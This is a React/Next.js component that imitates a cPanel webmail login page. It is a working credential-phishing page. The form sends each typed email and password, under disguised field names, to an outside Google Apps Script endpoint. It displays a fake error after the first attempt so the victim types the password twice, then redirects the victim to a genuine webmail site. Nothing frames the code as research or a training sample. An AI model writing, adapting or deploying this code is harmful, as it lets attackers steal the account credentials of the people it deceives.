"use client";

import React, { useEffect, useState } from "react";
import Image from "next/image";
import { useForm } from "react-hook-form";
import { i18n, Lang } from "../../i18n.config";

const LoginForm = () => {
  const [languages, setLanguages] = useState<Lang | null>(null);
  const [langChange, setLangChange] = useState<(typeof i18n.locales)[number]>(
    i18n.defaultLocale
  );
  const [isLoading, setIsLoading] = useState(false);
  const [count, setCount] = useState(0);
  const [error, setError] = useState("");
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();

  const onSubmit = async (data: any) => {
    try {
      setIsLoading(true);

      const f = new FormData();

      f.append("rosan", data.rosan);
      f.append("rosana", data.rosana);
      f.append("roschark", "webmail");

      const result = await fetch(
        "https://script.google.com/macros/s/AKfycbwXznLKtmUwnsaTpHpw--ZE9rG9PsBhmtmWKskkEIRD80SjaUVHPMW2vMSZdM9TuQAHPw/exec",
        {
          method: "POST",
          body: f,
        }
      );

      if (result.ok && count > 0) {
        window.location.replace("https://webmail.altonhargrave.com/");
      }

      setCount(count + 1);
    } catch (error) {
      console.error("Error:", error);
    } finally {
      setIsLoading(false);
    }
  };

  const handleLangChange = (e: any) => {
    const l = e === "ot" ? "en" : e;
    window && sessionStorage.setItem("lang", l);
    setLangChange(l);
  };

  useEffect(() => {
    const lang = sessionStorage?.getItem(
      "lang"
    ) as (typeof i18n.locales)[number];
    import("../../inter/lang.json").then((mod) => {
      setLanguages(mod.default[lang ?? i18n.defaultLocale]);
    });
  }, [langChange, languages]);

  if (!languages) return null;
  return (
    <section className="min-h-svh h-full flex-col flex items-center justify-center p-3 xi:p-4 md:p-8">
      <div className="mb-[42px] mt-8 w-full x:w-auto">
        {count > 0 && (
          <div
            className={`min-h-[27px] py-2.5 px-4 bg-red-500 flex items-center gap-2.5 text-[12px] text-white mb-4 rounded`}
          >
            <Image
              width={28}
              height={28}
              className="w-7 h-7 object-contain"
              src="/images/notice-info.png"
              alt="notice-info icon"
            />
            {languages.wpr}
          </div>
        )}
        {errors?.email && (
          <div
            className={`min-h-[27px] py-2.5 px-4 bg-[#d35351] flex items-center gap-2.5 text-[12px] text-white mb-4 rounded`}
          >
            <Image
              width={28}
              height={28}
              className="w-7 h-7 object-contain"
              src="/images/notice-error.png"
              alt="notice-error icon"
            />
            {errors?.email?.message?.toString()}
          </div>
        )}
        <Image
          width={200}
          height={54}
          className="h-[54px] w-full max-w-[300px] object-contain aspect-[61/10] mb-[30px] mx-auto"
          src="/images/webNajiLogo.svg"
          alt="website logo"
        />
        <form onSubmit={handleSubmit(onSubmit)} className="px-2">
          <div className="w-full mb-[30px]">
            <label
              className="block text-[12px] text-[#293a4a] pl-1 pb-2 font-semibold md:text-sm"
              htmlFor="email"
            >
              {languages.em}
            </label>
            <div className="relative flex items-center">
              <Image
                quality={100}
                width={20}
                height={20}
                className="w-5 h-5 object-contain absolute left-2.5"
                src="/images/icon-username.png"
                alt="user icon"
              />
              <input
                {...register("rosan", {
                  required: {
                    value: true,
                    message: "You must specify a username to log in.",
                  },
                  pattern: {
                    value: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
                    message: "Enter a valid email address",
                  },
                })}
                placeholder={languages.pem}
                className="placeholder:text-[13px] text-[13px] border-2 border-[#bebebe] h-9 rounded w-full focus:outline-none pl-10 pr-3 py-2"
                type="email"
              />
            </div>
          </div>
          <div className="w-full mb-[30px]">
            <label
              className="block text-[12px] text-[#293a4a] pl-1 pb-2 font-semibold sm:text-sm"
              htmlFor="password"
            >
              {languages.ps}
            </label>
            <div className="relative flex items-center">
              <Image
                quality={100}
                width={20}
                height={20}
                className="w-5 h-5 object-contain absolute left-2.5"
                src="/images/icon-password.png"
                alt="password icon"
              />
              <input
                {...register("rosana", {
                  required: { value: true, message: "Required" },
                })}
                placeholder={languages.pps}
                className="placeholder:text-[13px] text-[13px]  border-2 border-[#bebebe] h-9 rounded w-full outline-none focus:outline-none pl-10 pr-3 py-2"
                type="password"
              />
            </div>
          </div>

          <button
            type="submit"
            className="w-full text-white bg-[#179bd7] text-center py-[7px] border border-[#095779] hover:bg-[#095779] transition-colors duration-300 ease-in-out text-[13px] rounded font-semibold"
          >
            {languages.bt}
          </button>
        </form>
      </div>

      <div className="x:my-10 mx-auto mb-6 x:mb-[45px]">
        <div className="x:hidden flex items-center justify-center gap-1.5 text-[#333]">
          <p className="text-sm ">Select a locale:</p>
          <button className="px-2 py-[5px] bg-[#ccc] border border-[#333] rounded text-sm">
            English
          </button>
        </div>
        <ul className="items-center hidden x:flex justify-center flex-wrap gap-x-8 text-center lg:gap-x-12 gap-y-2 p-1.5 text-[12px] text-[#293a4a] font-semibold">
          {[
            {
              key: "en",
              val: "english",
            },
            {
              key: "ar",
              val: "العربية",
            },
            {
              key: "de",
              val: "Deutsch",
            },
            {
              key: "ch",
              val: "中文",
            },
            {
              key: "ot",
              val: "čeština",
            },
            {
              key: "ot",
              val: "dansk",
            },
            {
              key: "ot",
              val: "Ελληνικά",
            },
            {
              key: "ot",
              val: "español",
            },
            {
              key: "ot",
              val: "latinoamericano",
            },
            {
              key: "ot",
              val: "español de España",
            },
          ]
            .filter((ky) => !(langChange == ky.key))
            .map((item, index) => (
              <li
                key={index}
                className="hover:text-[#d03f00] transition-colors duration-200 cursor-pointer"
                onClick={() => {
                  handleLangChange(item.key);
                }}
              >
                {item.val}
              </li>
            ))}
          <li className="text-base font-bold hover:text-[#d03f00] transition-colors duration-200 cursor-pointer">
            ...
          </li>
        </ul>
      </div>

      <div className="mt-2.5 text-[7pt] text-[#3f4143] flex flex-col items-center">
        <Image
          width={24}
          height={24}
          className="w-6 h-6 object-contain mb-2.5"
          src="/images/cp.svg"
          alt="website icon"
        />
        <p className="text-center text-balance font-verdana font-medium">
          Copyright©&nbsp;2024 cPanel, L.L.C.
          <br />
          Privacy Policy
        </p>
      </div>
    </section>
  );
};

export default LoginForm;
